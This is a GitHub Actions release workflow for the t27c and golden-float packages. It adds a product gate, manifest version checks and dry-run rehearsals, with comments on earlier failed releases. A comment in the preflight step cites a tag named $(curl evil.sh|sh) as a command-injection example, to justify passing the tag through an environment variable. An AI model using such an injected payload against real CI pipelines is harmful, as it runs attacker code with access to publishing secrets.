# Release Pipeline
#
# This repository releases TWO products, and every job below used to fire for
# both. A tag reading t27c-v0.2.0 published `golden-float` and
# `golden-float-ffi` -- a different project -- while `t27c` itself went nowhere.
#
# Nine runs of this pipeline, nine failures, zero successes. "Failed" did not
# mean nothing happened: the 2026-04-07 run failed overall while its PyPI leg
# SUCCEEDED and burned golden-float 0.1.0, and the 2026-05-15 run failed overall
# while its crates.io leg SUCCEEDED and burned golden-float-ffi 0.1.0. Neither
# number can ever be reused. Nothing sequenced the jobs, so a failure in one
# left the other's publication standing.
#
# Three rules now hold:
#   1. PRODUCT GATE  -- a tag names its product, and only that product's jobs run
#   2. VERSION TRUTH -- every manifest must already say what the tag says
#   3. DRY RUN FIRST -- no registry is written until all rehearsals pass
#
# Every publishing job needs: preflight. There is no path to a registry that
# skips it.

name: Release Pipeline

on:
  release:
    types: [published]
  # tri:no-dispatch  every job keys off `github.event.release.tag_name`, which is
  #                  empty on a dispatch, so preflight refuses and nothing publishes.
  # NO `workflow_dispatch:`, deliberately, and it must not be added back.
  #
  # The comment that used to stand here justified one by the `paths:`-filter
  # argument -- a gate nothing has matched in months is unmeasured rather than
  # passing, so give it a way to be fired on purpose. That argument does not
  # apply to this file: it has no `paths:` filter, and every job keys off
  # `github.event.release.tag_name`.
  #
  # On a dispatch that value is EMPTY, so preflight's product gate takes its
  # `*)` branch, prints "Tag '' names no product" and exits 1. Every publishing
  # job `needs: preflight` and is skipped. The dispatch cannot publish, and it
  # cannot measure anything either -- it can only fail. Run 33204015910 on
  # 2026-08-28 is that, and is the only failure here not caused by a real tag.
  #
  # `tri gates unmeasured` will now list this workflow as `dispatch: -` and
  # advise adding one. For a pipeline keyed on a tag there is no default-branch
  # reading to take, so the advice does not apply; the tool's own footnote makes
  # the same point about `pr-only`, that a dispatch which starts a workflow and
  # measures nothing is not an invitation.
  #
  # Making a dispatch useful would mean giving preflight a tag input, which
  # makes preflight SUCCEED on a dispatch -- and preflight refusing is currently
  # the structural reason a dispatch cannot reach a registry. That would replace
  # a structural guard with five `if:` conditions, in front of `cargo publish`
  # and `npm publish` against live registries where a version is permanent, and
  # this pipeline has already burned two of them. Not done.

# Two runs for one tag could interleave four registry writes. They cannot
# overlap now, and a queued one is never cancelled -- cancelling mid-publish is
# how a partial publish is made.
concurrency:
  group: release-${{ github.event.release.tag_name }}
  cancel-in-progress: false

jobs:
  # ========================================================================
  # Preflight: which product, does every manifest agree, and does each
  # publish REHEARSE cleanly. Everything else needs this.
  # ========================================================================
  preflight:
    name: Preflight -- product, versions, dry runs
    runs-on: ubuntu-latest
    outputs:
      product: ${{ steps.identify.outputs.product }}
      version: ${{ steps.identify.outputs.version }}
    steps:
      - uses: actions/checkout@v4

      - name: Identify the product and version from the tag
        id: identify
        env:
          TAG: ${{ github.event.release.tag_name }}
        run: |
          set -euo pipefail
          # A tag name is attacker-controlled text. Interpolated straight into
          # `run:` it is SHELL: a tag called $(curl evil.sh|sh) executes. It
          # comes through env, where the shell sees a variable and never a
          # substitution. The Untrusted Input gate caught this on the commit
          # that introduced it.
          echo "tag: $TAG"
          case "$TAG" in
            t27c-v*)         PRODUCT=t27c;         VERSION="${TAG#t27c-v}" ;;
            golden-float-v*) PRODUCT=golden-float; VERSION="${TAG#golden-float-v}" ;;
            v*)              PRODUCT=golden-float; VERSION="${TAG#v}" ;;
            *)
              echo "::error::Tag '$TAG' names no product. Use t27c-v<version> or golden-float-v<version>."
              exit 1 ;;
          esac
          echo "product=$PRODUCT" >> "$GITHUB_OUTPUT"
          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
          echo "product: $PRODUCT   version: $VERSION"

      - name: Every manifest must already say what the tag says
        run: |
          set -euo pipefail
          V="${{ steps.identify.outputs.version }}"
          fail=0
          check() {  # file, found, label
            if [ "$2" != "$V" ]; then
              echo "::error file=$1::$3 is '$2' but the tag says '$V' -- edit $1"
              fail=1
            else
              echo "ok  $1 = $2"
            fi
          }
          if [ "${{ steps.identify.outputs.product }}" = "t27c" ]; then
            check bootstrap/Cargo.toml \
              "$(grep -m1 '^version' bootstrap/Cargo.toml | sed 's/.*"\(.*\)".*/\1/')" \
              "crate t27c version"
            # .zenodo.json describes T27, so it is checked against a T27 tag and
            # not against golden-float's. A DOI is minted from it and is forever.
            check .zenodo.json \
              "$(python3 -c "import json;print(json.load(open('.zenodo.json')).get('version',''))")" \
              ".zenodo.json version"
          else
            check ffi/Cargo.toml \
              "$(grep -m1 '^version' ffi/Cargo.toml | sed 's/.*"\(.*\)".*/\1/')" \
              "crate golden-float-ffi version"
            check bindings/python/pyproject.toml \
              "$(grep -m1 '^version' bindings/python/pyproject.toml | sed 's/.*"\(.*\)".*/\1/')" \
              "PyPI golden-float version"
            check bindings/javascript/package.json \
              "$(python3 -c "import json;print(json.load(open('bindings/javascript/package.json'))['version'])")" \
              "npm golden-float version"
          fi
          exit $fail

      - name: Setup Rust
        uses: dtolnay/rust-toolchain@stable

      - name: Rehearse the crates.io publish
        run: |
          set -euo pipefail
          if [ "${{ steps.identify.outputs.product }}" = "t27c" ]; then
            cargo publish --dry-run --manifest-path bootstrap/Cargo.toml
          else
            cargo publish --dry-run --manifest-path ffi/Cargo.toml
          fi

      - name: Rehearse against the live registries
        run: |
          set -euo pipefail
          V="${{ steps.identify.outputs.version }}"
          UA="t27-release-preflight (github actions)"
          if [ "${{ steps.identify.outputs.product }}" = "t27c" ]; then
            CRATE=t27c
          else
            CRATE=golden-float-ffi
          fi
          # A version that already exists cannot be replaced, only failed on --
          # and the failure would come AFTER some other leg had written.
          if curl -sf -A "$UA" "https://crates.io/api/v1/crates/$CRATE/$V" > /dev/null; then
            echo "::error::crates.io already has $CRATE $V. Versions are permanent; bump it."
            exit 1
          fi
          echo "ok  crates.io has no $CRATE $V"
          if [ "${{ steps.identify.outputs.product }}" != "t27c" ]; then
            if curl -sf "https://pypi.org/pypi/golden-float/$V/json" > /dev/null; then
              echo "::error::PyPI already has golden-float $V. Yanking hides a version, it never frees it."
              exit 1
            fi
            echo "ok  PyPI has no golden-float $V"
          fi
  # ========================================================================
  # Python: PyPI Publication via Maturin
  # ========================================================================
  python:
    name: Publish Python Package to PyPI
    needs: preflight
    if: needs.preflight.outputs.product == 'golden-float'
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest, windows-latest]
        target: [x86_64, aarch64]
        exclude:
          # Windows aarch64 not supported by GitHub Actions
          - os: windows-latest
            target: aarch64
          # macOS x86_64 not available
          - os: macos-latest
            target: x86_64

    steps:
      - name: Checkout code
        uses: actions/checkout@v6

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install Maturin
        run: pip install maturin

      - name: Build wheels
        run: |
          cd bindings/python
          maturin build --release --out ../../target/wheels --strip

      - name: Upload wheels (Ubuntu x86_64)
        if: matrix.os == 'ubuntu-latest' && matrix.target == 'x86_64'
        uses: actions/upload-artifact@v4
        with:
          name: python-wheels-x86_64
          path: target/wheels/*.whl
          retention-days: 7

      - name: Upload wheels (Ubuntu aarch64)
        if: matrix.os == 'ubuntu-latest' && matrix.target == 'aarch64'
        uses: actions/upload-artifact@v4
        with:
          name: python-wheels-aarch64
          path: target/wheels/*.whl
          retention-days: 7

      - name: Upload wheels (macOS aarch64)
        if: matrix.os == 'macos-latest'
        uses: actions/upload-artifact@v4
        with:
          name: python-wheels-macos
          path: target/wheels/*.whl
          retention-days: 7

      - name: Upload wheels (Windows x86_64)
        if: matrix.os == 'windows-latest'
        uses: actions/upload-artifact@v4
        with:
          name: python-wheels-windows
          path: target/wheels/*.whl
          retention-days: 7

  python-publish:
    name: Publish to PyPI
    needs: [preflight, python]
    if: needs.preflight.outputs.product == 'golden-float'
    runs-on: ubuntu-latest
    permissions:
      id-token: write  # IMPORTANT: required for Trusted Publisher (OIDC)
      contents: read
    steps:
      - name: Checkout code
        uses: actions/checkout@v6

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Download all wheels
        uses: actions/download-artifact@v4
        with:
          pattern: python-wheels-*
          path: target/wheels/
          merge-multiple: true

      - name: Publish to PyPI (Trusted Publisher OIDC)
        uses: PyO3/maturin-action@v1
        with:
          command: upload
          args: target/wheels/*

  # ========================================================================
  # JavaScript: npm Publication via wasm-pack
  # ========================================================================
  javascript:
    name: Build and Publish to npm
    needs: preflight
    if: needs.preflight.outputs.product == 'golden-float'
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v6

      - name: Setup Rust
        uses: actions-rs/toolchain@v1
        with:
          profile: minimal
          toolchain: stable
          target: wasm32-unknown-unknown

      - name: Install wasm-pack
        uses: jetli/wasm-pack-action@v0.4.0

      - name: Build WebAssembly
        run: |
          cd bindings/javascript
          wasm-pack build --target bundler --release

      - name: Update package.json for npm
        working-directory: bindings/javascript/pkg
        run: |
          # Ensure package name is golden-float
          npm pkg set name=golden-float
          npm pkg set repository.url=https://github.com/trinity-s3ai/t27
          npm pkg set author="Trinity S3AI"

      - name: Configure npm for publish
        run: |
          echo "//registry.npmjs.org/:_authToken=\${NODE_AUTH_TOKEN}" > .npmrc
          echo "scope=@trinity" >> .npmrc
          echo "registry=https://registry.npmjs.org/" >> .npmrc

      - name: Publish to npm
        working-directory: bindings/javascript/pkg
        run: npm publish --access public
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}

  # ========================================================================
  # Rust: crates.io Publication
  # ========================================================================
  crates:
    name: Publish golden-float-ffi to crates.io
    needs: preflight
    if: needs.preflight.outputs.product == 'golden-float'
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v6

      - name: Setup Rust
        uses: dtolnay/rust-toolchain@stable

      - name: Publish golden-float-ffi
        run: |
          cd ffi
          cargo publish --token ${{ secrets.CRATES_TOKEN }}

  # ========================================================================
  # Zenodo: DOI Generation (separate workflow handles this)
  # ========================================================================
  # Note: Zenodo publication is handled by zenodo-publish.yml
  # This is triggered automatically on release publication

  # ========================================================================
  # t27c: the crate this repository's own tag is named for, and which no job
  # published until now. The name is unclaimed on crates.io.
  # ========================================================================
  t27c:
    name: Publish t27c to crates.io
    needs: preflight
    if: needs.preflight.outputs.product == 't27c'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
      - name: Publish
        run: cargo publish --manifest-path bootstrap/Cargo.toml --token ${{ secrets.CRATES_TOKEN }}
